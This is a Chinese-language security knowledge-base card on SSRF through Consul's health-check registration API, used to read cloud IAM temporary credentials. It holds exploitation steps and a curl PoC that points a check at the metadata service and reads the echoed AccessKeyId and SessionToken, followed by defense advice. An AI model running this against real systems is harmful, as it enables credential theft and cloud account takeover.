---
id: web-generic-ssrf-consul-agent-check-register-iam-credentials
title: Consul /v1/agent/check/register 健康检查 SSRF：HTTP 检查回显云 IAM 临时凭据，响应过长被截断
type: scenario
domain: web
path: web/generic/ssrf
technique: consul-agent-health-check-http-ssrf
tags:
- web
- ssrf
- consul
- cloud
- iam
- health-check
- unauth
- internal-network
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-11'
updated: '2026-11-11'
verification:
  verified_by: verifier-V530
  verified_at: '2026-11-11T17:02:44+08:00'
  notes: '已对照原文全文与6张图核对。原文 Consul 段给出 PUT /v1/agent/check/register 注册 http 健康检查的完整 JSON（id/name/http/tls_skip_verify/method/interval/timeout 与卡片逐字段一致）、curl -X PUT 与查看 health checks 回显、并明确『仅可显示部分数据，过长会被截断』；图02 Output 为 HTTP GET http://.../latest/iam/security_cred... 200 OK Output: {ExpiredTime,CurrentTime,AccessKeyId,SecretAccessKey,SessionToken}，IAM 凭据回显属实。已修正原稿一处矛盾表述（『完整读回（部分截断）』改为凭据已回显+过长截断）。dedup=new，库内无 Consul check/register SSRF 卡，top 候选均为其他产品/通用概览，非同链。原文未标 Consul 版本，affected_versions 留空正确。未对任何目标发起请求。'
url: /docs/web/generic/ssrf/web-generic-ssrf-consul-agent-check-register-iam-credentials/
draft: false
kb_aliases:
- Consul SSRF
- agent/check/register
- Consul 健康检查 SSRF
- Consul 读取 IAM
- Redis health check
---

## 一句话结论

未授权访问的 Consul Agent API 允许通过 `PUT /v1/agent/check/register` 注册 HTTP 健康检查；把检查地址指向云元数据 IAM 凭据接口后，Consul 服务端会周期性请求并把响应写入健康检查的 Output 字段，在 UI/API 中即可读回 AccessKeyId/SecretAccessKey/SessionToken（响应过长时会被截断）。

## 原理

- Consul 的健康检查由 agent 执行：`http` 类型检查会让 agent 按 `interval` 周期性地向配置的 `http` URL 发请求，并按响应状态更新检查结果。
- 检查详情接口/UI 会展示检查的 Output（包含状态码与响应体片段），因此攻击者可以把 `http` 指向内部服务或云元数据地址，让 Consul 主机代发请求并回显。
- 若 Consul HTTP API（默认 8500）暴露且未启用 ACL，任何人都能注册检查；Consul 常部署在云主机上，agent 可访问 `169.254.169.254`/`100.100.100.200` 等元数据地址，从而泄露实例角色临时凭据。
- 原文截图显示检查名为 “Redis health check”，Output 为 `HTTP GET http://.../latest/iam/security_cred... 200 OK Output: {"ExpiredTime":...,"AccessKeyId":"...","SecretAccessKey":"...","SessionToken":"..."}`，IAM 凭据已通过 Output 回显；原文同时说明响应过长时只会显示部分数据、会被截断。

## 触发条件

- Consul Agent HTTP API 可访问（8500 暴露公网/内网），未启用 ACL 或 ACL 允许匿名注册检查；
- 允许 `http` 类型健康检查，且 agent 可向外发起请求；
- Consul 主机能访问云元数据或目标内网；
- 响应内容可通过健康检查 Output 回显（过长会被截断，可换更短路径或分号读取）。

## 利用步骤

1. 访问 Consul UI/`/v1/agent/self` 确认未授权与版本；
2. 构造检查 JSON，把 `http` 指向元数据 IAM 接口：
   ```json
   { "id": "redis-1", "name": "Redis health check", "http": "http://<metadata>/latest/iam/security_credentials", "tls_skip_verify": false, "method": "GET", "interval": "10s", "timeout": "1s" }
   ```
3. `curl -X PUT http://target:8500/v1/agent/check/register -d @json` 注册；
4. 等待一个 interval 后查看 UI 的 Health Checks 或 `GET /v1/health/checks/<service>` / `/v1/agent/checks`，读取 Output 中的 IAM 凭据；
5. 用凭据调用云 API；也可把 URL 换成内网 admin 面板、K8s apiserver、etcd 等继续探测。

## PoC

```bash
cat > check.json <<'EOF'
{ "id": "redis-1", "name": "Redis health check", "http": "http://100.100.100.200/latest/iam/security_credentials", "tls_skip_verify": false, "method": "GET", "interval": "10s", "timeout": "1s" }
EOF
curl -X PUT http://target:8500/v1/agent/check/register -d @check.json
curl http://target:8500/v1/agent/checks
```

## 变体与关联

- `tcp` 检查可做端口探测（无回显）；若 Consul 允许脚本检查/执行，可能直接 RCE（原文提示新版较少）；
- 同样的“服务端代发请求并回显”面也存在于其他运维组件：Grafana 数据源、Selenium Grid、Cerebro、ClickHouse url() 表函数（见库内对应卡）；
- 可注册多个不同 URL 的检查并行探测内网网段。

## 检测与防御

- 为 Consul 启用 ACL 并禁止匿名注册检查；管理端口只监听内网/本机；
- 禁止 agent 访问云元数据地址与不必要的内网网段（网络策略/代理白名单）；
- 监控 `/v1/agent/check/register` 的异常调用与指向元数据/内网的 http 检查；
- 定期审计已有健康检查项，清理未知来源的检查。
